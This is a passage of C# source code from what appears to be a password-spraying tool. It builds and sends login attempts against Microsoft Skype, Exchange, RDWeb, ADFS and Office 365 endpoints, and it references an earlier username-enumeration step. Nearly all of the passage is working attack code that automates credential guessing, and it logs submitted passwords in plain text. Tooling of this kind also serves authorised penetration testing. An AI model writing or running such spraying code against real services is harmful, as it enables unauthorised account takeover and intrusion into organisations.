                UI.ThreadSafeAppendLog("[3]NTLM Spray URL: " + passSprayRequest.url);
            }
            else
            {
                switch (service)
                {
                    case MicrosoftService.Skype:
                        passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.POST, true);
                        passSprayRequest.request.ContentType = "application/x-www-form-urlencoded";
                        passSprayRequest.postData = string.Format("grant_type=password&username={0}&password={1}", username, Uri.EscapeDataString(password));
                        UI.ThreadSafeAppendLog("[3]Skype Post Data: " + passSprayRequest.postData);
                        UI.ThreadSafeAppendLog("[3]Skype URL: " + passSprayRequest.url);
                        break;
                    case MicrosoftService.Exchange2007:
                        passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.GET, true);
                        //Base64 in auth header - so no escape
                        passSprayRequest.request.Headers.Add(string.Format("Authorization: Basic {0}", System.Convert.ToBase64String(System.Text.ASCIIEncoding.ASCII.GetBytes(string.Format("{0}:{1}", username, password)))));
                        UI.ThreadSafeAppendLog("[3]Exchange2007 URL: " + passSprayRequest.url);
                        UI.ThreadSafeAppendLog("[3]Exchange2007 Header: " + string.Format("Authorization: Basic {0}", System.Convert.ToBase64String(System.Text.ASCIIEncoding.ASCII.GetBytes(string.Format("{0}:{1}", username, password)))));
                        break;
                    case MicrosoftService.Exchange:
                        passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.GET, true);
                        passSprayRequest.request.Headers.Add(string.Format("Authorization: Basic {0}", System.Convert.ToBase64String(System.Text.ASCIIEncoding.ASCII.GetBytes(string.Format("{0}:{1}", username, password)))));
                        UI.ThreadSafeAppendLog("[3]Exchange URL: " + passSprayRequest.url);
                        break;
                    case MicrosoftService.RDWeb:
                        passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.POST, false);
                        passSprayRequest.request.ContentType = "application/x-www-form-urlencoded";
                        passSprayRequest.postData = string.Format("DomainUserName={0}&UserPass={1}", username, Uri.EscapeDataString(password));
                        UI.ThreadSafeAppendLog("[3]RDWeb Post Data: " + passSprayRequest.postData);
                        UI.ThreadSafeAppendLog("[3]RDWeb URL: " + passSprayRequest.url);
                        break;
                    case MicrosoftService.ADFS:
                        if (MSISSamlRequest == null || MSISSamlRequest == "")
                        {
                            //Should never hit here as service interface gets/has this
                            UI.ThreadSafeAppendLog("[2]SAML Data not found...");
                        }
                        else
                        {
                            passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url + "?client-request-id=&pullStatus=0", UI, HttpMethodChoice.POST, false);
                            passSprayRequest.request.CookieContainer = new CookieContainer();
                            passSprayRequest.request.CookieContainer.Add(passSprayRequest.request.RequestUri, new Cookie("MSISSamlRequest", MSISSamlRequest));
                            passSprayRequest.request.ContentType = "application/x-www-form-urlencoded";
                            passSprayRequest.postData = string.Format("UserName={0}&Password={1}&AuthMethod=FormsAuthentication", username, Uri.EscapeDataString(password));
                            UI.ThreadSafeAppendLog("[3]ADFS Post Data: " + passSprayRequest.postData);
                            UI.ThreadSafeAppendLog("[3]ADFS URL: " + passSprayRequest.url);
                        }
                        break;
                    case MicrosoftService.Office365:
                        passSprayRequest = CreateWebRequestSpray(host.SprayURL.Url, UI, HttpMethodChoice.POST, false);
                        passSprayRequest.request.ContentType = "application/x-www-form-urlencoded";
                        passSprayRequest.postData = string.Format("grant_type=password&username={0}&password={1}&client_id=randomid&scope=whatevs", username, Uri.EscapeDataString(password));
                        break;
                }
            }

            try
            {
                if (passSprayRequest.request.Method == "GET")
                {
                    UI.ThreadSafeAppendLog("[3]Making GET Request...");
                    HttpWebResponse response = passSprayRequest.MakeGETRequest();
                    return response;
                }
                else if (passSprayRequest.request.Method == "POST")
                {
                    UI.ThreadSafeAppendLog("[3]Making POST Request...");
                    HttpWebResponse response = passSprayRequest.MakePOSTRequest();
                    return response;
                }
                return null;
            }
            catch (Exception e)
            {
                UI.ThreadSafeAppendLog("[1]EXCEPTION: " + e.ToString());
                return null;
            }
        }

        public bool ValidateOptions(PasswordSprayType method, string formatChoice, MainWindow UI, UsernameFormat discoveredFormat)
        {
            int g2g = 1;
            //Check something is picked
            if (method == PasswordSprayType.nullMethod)
            {
                UI.ThreadSafeAppendLog("[1]Please choose an option...");
                g2g = 0;
            }
            if (method == PasswordSprayType.UseDiscoveredFormat && discoveredFormat == UsernameFormat.nullFormat)
            {
                UI.ThreadSafeAppendLog("[1]Please run Username Enumeration > Smart Enumeration to uncover the username format for the domain...");
                g2g = 0;
            }
            if (method == PasswordSprayType.EnumeratedUsers && UI.accessTokens.Count < 1)
            {
                UI.ThreadSafeAppendLog("[1]No users have been enumerated...");
                g2g = 0;
            }



            if (g2g == 1)
                return true;
            else
                return false;
        }

        
        
    }

}
